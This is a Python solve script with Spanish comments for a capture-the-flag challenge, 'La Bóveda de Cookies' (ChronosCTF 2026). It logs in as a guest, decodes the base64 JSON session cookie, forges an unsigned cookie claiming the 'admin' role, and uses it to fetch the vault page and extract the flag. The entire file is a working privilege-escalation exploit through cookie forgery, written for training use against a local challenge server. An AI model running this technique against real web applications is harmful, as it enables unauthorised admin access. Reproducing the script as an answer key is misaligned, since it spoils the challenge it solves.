#!/usr/bin/env python3
"""
Script de solución automatizada para el reto 'La Bóveda de Cookies' (ChronosCTF 2026)
Uso: python solve.py [TARGET_URL]
Ejemplo: python solve.py http://localhost:8002
"""

import base64
import json
import re
import sys
import requests

TARGET_URL = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8002"


def solve():
    print(f"[*] Conectando al objetivo: {TARGET_URL}")

    # 1. Autenticarse como invitado para recibir la cookie original
    login_url = f"{TARGET_URL}/login"
    session = requests.Session()
    login_data = {
        "username": "invitado",
        "password": "invitado123"
    }

    try:
        res = session.post(login_url, data=login_data, timeout=5, allow_redirects=False)
        print(f"[+] Inicio de sesion realizado (Status: {res.status_code})")
    except Exception as e:
        print(f"[-] Error de conexion al login: {e}")
        return False

    original_cookie = session.cookies.get("vault_session")
    if original_cookie:
        print(f"[+] Cookie recibida: {original_cookie}")
        try:
            padded = original_cookie + "=" * ((4 - len(original_cookie) % 4) % 4)
            decoded = json.loads(base64.b64decode(padded).decode())
            print(f"[+] Contenido decodificado: {decoded}")
        except Exception:
            pass

    # 2. Forjar la cookie con privilegios elevados de 'admin'
    forged_payload = {
        "username": "admin",
        "role": "admin"
    }
    forged_b64 = base64.b64encode(json.dumps(forged_payload).encode()).decode()
    print(f"[+] Cookie forjada con rol 'admin': {forged_b64}")

    # 3. Enviar solicitud con la cookie forjada hacia la boveda
    forged_cookies = {
        "vault_session": forged_b64
    }

    try:
        vault_res = requests.get(f"{TARGET_URL}/", cookies=forged_cookies, timeout=5)
        vault_res.raise_for_status()
    except Exception as e:
        print(f"[-] Error al solicitar acceso a la boveda: {e}")
        return False

    # 4. Extraer la bandera mediante expresion regular (soporta GUIDs y prefijos dinamicos de GZCTF)
    flag_match = re.search(r"(?:[A-Za-z0-9_]+)\{[a-zA-Z0-9_\-!@#$%^&*()]+\}", vault_res.text)
    if flag_match:
        flag = flag_match.group(0)
        print(f"\n[+] [FLAG RECUPERADA] => {flag}\n")
        return True
    else:
        print("[-] No se encontro una bandera valida en la boveda.")
        return False


if __name__ == "__main__":
    success = solve()
    sys.exit(0 if success else 1)
